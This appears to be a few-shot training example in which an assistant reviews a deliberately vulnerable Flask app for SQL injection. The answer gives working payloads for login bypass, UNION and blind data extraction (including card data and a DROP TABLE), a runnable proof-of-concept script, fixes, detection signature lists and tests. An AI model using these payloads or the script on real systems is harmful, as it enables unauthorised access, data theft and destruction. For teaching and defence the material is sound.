# Few-Shot Example: SQL Injection Detection and Prevention

**Domain:** security
**Skill Level:** Intermediate
**Pattern:** Identify → Exploit → Fix → Verify

---

## User Query

Review this Python web application for SQL injection vulnerabilities:

```python
from flask import Flask, request, jsonify
import sqlite3

app = Flask(__name__)

def get_db():
    return sqlite3.connect('app.db')

@app.route('/users/search')
def search_users():
    query = request.args.get('q', '')
    db = get_db()
    cursor = db.execute(f"SELECT * FROM users WHERE name LIKE '%{query}%'")
    users = cursor.fetchall()
    return jsonify(users)

@app.route('/users/<user_id>')
def get_user(user_id):
    db = get_db()
    cursor = db.execute(f"SELECT * FROM users WHERE id = {user_id}")
    user = cursor.fetchone()
    return jsonify(user) if user else ('Not found', 404)

@app.route('/login', methods=['POST'])
def login():
    data = request.json
    username = data.get('username')
    password = data.get('password')

    db = get_db()
    query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
    cursor = db.execute(query)
    user = cursor.fetchone()

    if user:
        return jsonify({"status": "success", "user_id": user[0]})
    return jsonify({"status": "failed"}), 401

@app.route('/users/filter')
def filter_users():
    order_by = request.args.get('sort', 'id')
    direction = request.args.get('dir', 'ASC')

    db = get_db()
    query = f"SELECT * FROM users ORDER BY {order_by} {direction}"
    cursor = db.execute(query)
    return jsonify(cursor.fetchall())
```

---

## Exemplary Response

### 1. Vulnerability Assessment

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                    SQL INJECTION VULNERABILITY MAP                          │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  ENDPOINT              INJECTION POINT       TYPE              SEVERITY     │
│  ────────────────────────────────────────────────────────────────────────   │
│  /users/search         ?q=                   String LIKE       HIGH         │
│  /users/<user_id>      URL path              Numeric           HIGH         │
│  /login                username, password    Auth bypass       CRITICAL     │
│  /users/filter         ?sort=, ?dir=         ORDER BY          MEDIUM       │
│                                                                              │
│  INJECTION TYPES PRESENT:                                                   │
│  ├── Classic SQLi (String concatenation)                                    │
│  ├── Numeric SQLi (No type validation)                                      │
│  ├── Authentication Bypass                                                  │
│  └── ORDER BY Injection                                                     │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
```

| Location | Line | CWE | CVSS | Impact |
|----------|------|-----|------|--------|
| search_users | 12 | CWE-89 | 9.8 | Data exfiltration |
| get_user | 18 | CWE-89 | 9.8 | Data exfiltration |
| login | 26 | CWE-89 | 10.0 | Authentication bypass |
| filter_users | 35 | CWE-89 | 7.5 | Information disclosure |

### 2. Attack Demonstrations

#### 2.1 Authentication Bypass

```python
# Original vulnerable query:
# SELECT * FROM users WHERE username = '{username}' AND password = '{password}'

# Attack payload:
username = "admin' --"
password = "anything"

# Resulting query:
# SELECT * FROM users WHERE username = 'admin' --' AND password = 'anything'
#                                              ↑ Comment ignores password check!

# Alternative payloads:
payloads = [
    {"username": "admin'--", "password": "x"},           # Comment injection
    {"username": "' OR '1'='1", "password": "' OR '1'='1"},  # Always true
    {"username": "admin' OR 1=1--", "password": "x"},    # Boolean bypass
    {"username": "' UNION SELECT 1,2,3--", "password": "x"},  # Union attack
]
```

#### 2.2 Data Exfiltration via UNION

```python
# Vulnerable endpoint: /users/search?q=

# Step 1: Determine column count
payloads_column_count = [
    "' UNION SELECT NULL--",           # Error
    "' UNION SELECT NULL,NULL--",      # Error
    "' UNION SELECT NULL,NULL,NULL--", # Success! 3 columns
]

# Step 2: Extract data
attack_url = "/users/search?q=' UNION SELECT username,password,email FROM users--"

# Step 3: Extract database schema
schema_extraction = "' UNION SELECT sql,NULL,NULL FROM sqlite_master WHERE type='table'--"

# Step 4: Extract from other tables
other_tables = "' UNION SELECT card_number,cvv,expiry FROM payments--"
```

#### 2.3 Blind SQL Injection

```python
# When no direct output - use boolean or time-based techniques

# Boolean-based blind:
# True condition - returns results
"/users/search?q=' AND 1=1--"

# False condition - returns empty
"/users/search?q=' AND 1=2--"

# Extract data character by character:
def extract_password_blind(target_user):
    password = ""
    for position in range(1, 50):
        for char in string.printable:
            payload = f"' AND (SELECT SUBSTR(password,{position},1) FROM users WHERE username='{target_user}')='{char}'--"
            response = requests.get(f"{URL}/users/search?q={payload}")
            if len(response.json()) > 0:
                password += char
                break
    return password

# Time-based blind (SQLite):
"/users/search?q=' AND (SELECT CASE WHEN (1=1) THEN randomblob(100000000) ELSE 0 END)--"
```

#### 2.4 ORDER BY Injection

```python
# Vulnerable endpoint: /users/filter?sort=name&dir=ASC

# Error-based extraction:
"/users/filter?sort=(CASE WHEN (SELECT COUNT(*) FROM users)>0 THEN id ELSE name END)"

# Boolean extraction via ordering:
"/users/filter?sort=(CASE WHEN (SELECT SUBSTR(password,1,1) FROM users WHERE id=1)='a' THEN 0 ELSE 1 END)"
```

### 3. Proof of Concept Script

```python
#!/usr/bin/env python3
"""
sql_injection_poc.py - Demonstrates SQL injection vulnerabilities
For authorized testing only.
"""

import requests
import string
from urllib.parse import quote

TARGET = "http://localhost:5000"


class SQLiTester:
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()

    def test_auth_bypass(self):
        """Test authentication bypass via SQL injection."""
        print("\n[1] Testing Authentication Bypass")
        print("=" * 50)

        payloads = [
            {"username": "admin'--", "password": "x"},
            {"username": "' OR '1'='1'--", "password": "x"},
            {"username": "admin' OR 1=1--", "password": "x"},
        ]

        for payload in payloads:
            response = self.session.post(
                f"{self.base_url}/login",
                json=payload
            )
            if response.status_code == 200 and "success" in response.text:
                print(f"[VULN] Auth bypass successful!")
                print(f"       Payload: {payload}")
                print(f"       Response: {response.json()}")
                return True

        print("[SAFE] Auth bypass failed")
        return False

    def test_union_injection(self):
        """Test UNION-based SQL injection."""
        print("\n[2] Testing UNION Injection")
        print("=" * 50)

        # First, determine column count
        for cols in range(1, 10):
            nulls = ",".join(["NULL"] * cols)
            payload = f"' UNION SELECT {nulls}--"
            response = self.session.get(
                f"{self.base_url}/users/search",
                params={"q": payload}
            )
            if response.status_code == 200:
                print(f"[INFO] Table has {cols} columns")
                break

        # Extract data
        payload = "' UNION SELECT username,password,email FROM users--"
        response = self.session.get(
            f"{self.base_url}/users/search",
            params={"q": payload}
        )

        if response.status_code == 200:
            data = response.json()
            if len(data) > 0:
                print(f"[VULN] Data extracted via UNION injection!")
                for row in data[:5]:
                    print(f"       {row}")
                return True

        print("[SAFE] UNION injection failed")
        return False

    def test_numeric_injection(self):
        """Test numeric parameter injection."""
        print("\n[3] Testing Numeric Injection")
        print("=" * 50)

        # Basic numeric injection
        payloads = [
            "1 OR 1=1",
            "1; DROP TABLE users--",
            "1 UNION SELECT 1,2,3",
        ]

        for payload in payloads:
            response = self.session.get(
                f"{self.base_url}/users/{quote(payload)}"
            )
            if response.status_code == 200:
                print(f"[VULN] Numeric injection possible!")
                print(f"       Payload: {payload}")
                return True

        print("[SAFE] Numeric injection failed")
        return False

    def extract_schema(self):
        """Extract database schema via SQL injection."""
        print("\n[4] Extracting Database Schema")
        print("=" * 50)

        payload = "' UNION SELECT sql,NULL,NULL FROM sqlite_master WHERE type='table'--"
        response = self.session.get(
            f"{self.base_url}/users/search",
            params={"q": payload}
        )

        if response.status_code == 200:
            data = response.json()
            print("[VULN] Schema extracted:")
            for row in data:
                if row[0] and "CREATE" in str(row[0]):
                    print(f"       {row[0]}")
            return True

        return False


def main():
    tester = SQLiTester(TARGET)

    print("SQL Injection Vulnerability Assessment")
    print("=" * 50)
    print(f"Target: {TARGET}")

    tester.test_auth_bypass()
    tester.test_union_injection()
    tester.test_numeric_injection()
    tester.extract_schema()


if __name__ == "__main__":
    main()
```

### 4. Remediation

#### 4.1 Parameterized Queries (Primary Defense)

```python
from flask import Flask, request, jsonify
import sqlite3

app = Flask(__name__)

def get_db():
    conn = sqlite3.connect('app.db')
    conn.row_factory = sqlite3.Row  # Return dicts instead of tuples
    return conn

@app.route('/users/search')
def search_users():
    query = request.args.get('q', '')
    db = get_db()

    # FIXED: Use parameterized query with placeholder
    cursor = db.execute(
        "SELECT * FROM users WHERE name LIKE ?",
        (f'%{query}%',)  # Parameter passed separately
    )

    users = [dict(row) for row in cursor.fetchall()]
    return jsonify(users)

@app.route('/users/<int:user_id>')  # FIXED: Type constraint in route
def get_user(user_id):
    db = get_db()

    # FIXED: Parameterized query
    cursor = db.execute(
        "SELECT * FROM users WHERE id = ?",
        (user_id,)
    )

    user = cursor.fetchone()
    return jsonify(dict(user)) if user else ('Not found', 404)

@app.route('/login', methods=['POST'])
def login():
    data = request.json
    username = data.get('username', '')
    password = data.get('password', '')

    db = get_db()

    # FIXED: Parameterized query
    cursor = db.execute(
        "SELECT * FROM users WHERE username = ? AND password = ?",
        (username, password)
    )

    user = cursor.fetchone()

    if user:
        return jsonify({"status": "success", "user_id": user['id']})
    return jsonify({"status": "failed"}), 401
```

#### 4.2 Whitelist Validation for Dynamic Parts

```python
@app.route('/users/filter')
def filter_users():
    # FIXED: Whitelist allowed column names
    ALLOWED_COLUMNS = {'id', 'name', 'email', 'created_at'}
    ALLOWED_DIRECTIONS = {'ASC', 'DESC'}

    order_by = request.args.get('sort', 'id')
    direction = request.args.get('dir', 'ASC').upper()

    # Validate against whitelist
    if order_by not in ALLOWED_COLUMNS:
        order_by = 'id'
    if direction not in ALLOWED_DIRECTIONS:
        direction = 'ASC'

    db = get_db()
    # Safe because values are from whitelist, not user input
    query = f"SELECT * FROM users ORDER BY {order_by} {direction}"
    cursor = db.execute(query)

    return jsonify([dict(row) for row in cursor.fetchall()])
```

#### 4.3 ORM Approach (SQLAlchemy)

```python
from flask import Flask, request, jsonify
from flask_sqlalchemy import SQLAlchemy
from sqlalchemy import or_

app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///app.db'
db = SQLAlchemy(app)

class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), unique=True, nullable=False)
    password = db.Column(db.String(120), nullable=False)  # Should be hashed!
    name = db.Column(db.String(120))
    email = db.Column(db.String(120))

@app.route('/users/search')
def search_users():
    query = request.args.get('q', '')

    # ORM automatically handles parameterization
    users = User.query.filter(User.name.ilike(f'%{query}%')).all()

    return jsonify([{
        'id': u.id,
        'name': u.name,
        'email': u.email
    } for u in users])

@app.route('/users/<int:user_id>')
def get_user(user_id):
    # Type-safe, parameterized
    user = User.query.get_or_404(user_id)
    return jsonify({'id': user.id, 'name': user.name})

@app.route('/login', methods=['POST'])
def login():
    data = request.json

    # ORM query - automatically parameterized
    user = User.query.filter_by(
        username=data.get('username'),
        password=data.get('password')  # Remember: hash passwords!
    ).first()

    if user:
        return jsonify({"status": "success", "user_id": user.id})
    return jsonify({"status": "failed"}), 401

@app.route('/users/filter')
def filter_users():
    ALLOWED_COLUMNS = {'id', 'name', 'email', 'created_at'}

    sort_column = request.args.get('sort', 'id')
    if sort_column not in ALLOWED_COLUMNS:
        sort_column = 'id'

    direction = request.args.get('dir', 'asc').lower()

    # Use getattr to safely get column
    column = getattr(User, sort_column)
    if direction == 'desc':
        column = column.desc()

    users = User.query.order_by(column).all()
    return jsonify([{'id': u.id, 'name': u.name} for u in users])
```

### 5. Defense in Depth

```python
# Additional security layers

# 1. Input validation
import re
from functools import wraps

def validate_input(pattern):
    """Decorator for input validation."""
    def decorator(f):
        @wraps(f)
        def wrapper(*args, **kwargs):
            for key, value in request.args.items():
                if not re.match(pattern, str(value)):
                    return jsonify({"error": "Invalid input"}), 400
            return f(*args, **kwargs)
        return wrapper
    return decorator

@app.route('/users/search')
@validate_input(r'^[a-zA-Z0-9\s\-_@.]+$')  # Alphanumeric + common chars
def search_users():
    # ...
    pass

# 2. WAF-style pattern detection
SQLI_PATTERNS = [
    r"(\%27)|(\')|(\-\-)|(\%23)|(#)",  # Basic SQL meta-chars
    r"((\%3D)|(=))[^\n]*((\%27)|(\')|(\-\-)|(\%3B)|(;))",  # SQL injection
    r"\w*((\%27)|(\'))((\%6F)|o|(\%4F))((\%72)|r|(\%52))",  # 'or' pattern
    r"((\%27)|(\'))union",  # UNION attacks
]

def detect_sqli(value):
    for pattern in SQLI_PATTERNS:
        if re.search(pattern, value, re.IGNORECASE):
            return True
    return False

# 3. Least privilege database user
# CREATE USER 'app_user'@'localhost' IDENTIFIED BY 'password';
# GRANT SELECT, INSERT, UPDATE ON app.users TO 'app_user'@'localhost';
# -- No DELETE, DROP, ALTER permissions!

# 4. Error handling (don't leak info)
@app.errorhandler(Exception)
def handle_error(error):
    # Log detailed error internally
    app.logger.error(f"Error: {error}", exc_info=True)
    # Return generic message to user
    return jsonify({"error": "An error occurred"}), 500
```

### 6. Verification Tests

```python
# test_sql_injection.py
import pytest
from app import app, db, User

@pytest.fixture
def client():
    app.config['TESTING'] = True
    app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///:memory:'

    with app.test_client() as client:
        with app.app_context():
            db.create_all()
            # Add test user
            user = User(username='testuser', password='hashed_pw', name='Test')
            db.session.add(user)
            db.session.commit()
        yield client

class TestSQLInjectionPrevention:
    """Verify SQL injection is prevented."""

    SQLI_PAYLOADS = [
        "' OR '1'='1",
        "'; DROP TABLE users;--",
        "' UNION SELECT * FROM users--",
        "1; DELETE FROM users",
        "admin'--",
    ]

    def test_search_rejects_sqli(self, client):
        """Search endpoint should not execute injected SQL."""
        for payload in self.SQLI_PAYLOADS:
            response = client.get(f'/users/search?q={payload}')
            # Should return empty results, not all users
            assert response.status_code == 200
            data = response.json
            # Injection shouldn't return extra data
            assert len(data) <= 1  # At most the legitimately matching user

    def test_login_rejects_sqli(self, client):
        """Login should not be bypassable via SQL injection."""
        for payload in self.SQLI_PAYLOADS:
            response = client.post('/login', json={
                'username': payload,
                'password': 'anything'
            })
            # Should fail authentication
            assert response.status_code == 401

    def test_numeric_id_validated(self, client):
        """Non-numeric IDs should be rejected."""
        response = client.get('/users/1 OR 1=1')
        assert response.status_code == 404  # Flask route won't match

    def test_order_by_whitelist(self, client):
        """ORDER BY should only accept whitelisted columns."""
        # Valid column
        response = client.get('/users/filter?sort=name&dir=ASC')
        assert response.status_code == 200

        # Invalid column - should default to 'id'
        response = client.get('/users/filter?sort=password&dir=ASC')
        assert response.status_code == 200  # Still works, but uses 'id'

        # SQL injection attempt
        response = client.get('/users/filter?sort=id;DROP TABLE users--')
        assert response.status_code == 200  # Sanitized to 'id'
```

### 7. Detection and Monitoring

```python
# SQL injection detection middleware
import logging
from flask import request, g
import time

logging.basicConfig(level=logging.INFO)
sqli_logger = logging.getLogger('sqli_detection')

SQLI_SIGNATURES = [
    "union select", "or 1=1", "' or '", "'; --",
    "drop table", "insert into", "delete from",
    "benchmark(", "sleep(", "waitfor delay",
]

@app.before_request
def detect_sqli_attempt():
    """Log potential SQL injection attempts."""
    suspicious = False
    details = []

    # Check all input sources
    for source, data in [
        ('args', request.args),
        ('form', request.form),
        ('json', request.json or {}),
    ]:
        for key, value in data.items() if isinstance(data, dict) else []:
            value_lower = str(value).lower()
            for sig in SQLI_SIGNATURES:
                if sig in value_lower:
                    suspicious = True
                    details.append(f"{source}.{key}: '{value}'")

    if suspicious:
        sqli_logger.warning(
            f"Potential SQLi attempt | "
            f"IP: {request.remote_addr} | "
            f"Path: {request.path} | "
            f"Details: {details}"
        )
        # Optionally: rate limit or block IP
        g.sqli_detected = True
```

---

## Why This Is A Good Example

- Shows multiple SQL injection types (UNION, Boolean, Time-based)
- Complete attack demonstrations with payloads
- Multiple remediation approaches (parameterized, ORM, whitelist)
- Defense in depth strategies
- Verification tests proving fix effectiveness

---

## Key Patterns

1. **Parameterized Queries** - Always separate data from code
2. **Whitelist Validation** - For dynamic SQL parts like ORDER BY
3. **ORM Usage** - Built-in protection against SQLi
4. **Defense in Depth** - Multiple layers of protection

---

**Tags:** #security #sqli #cwe-89 #owasp #injection #database
**Version:** 1.0.0
**Last Updated:** 2026-01-23
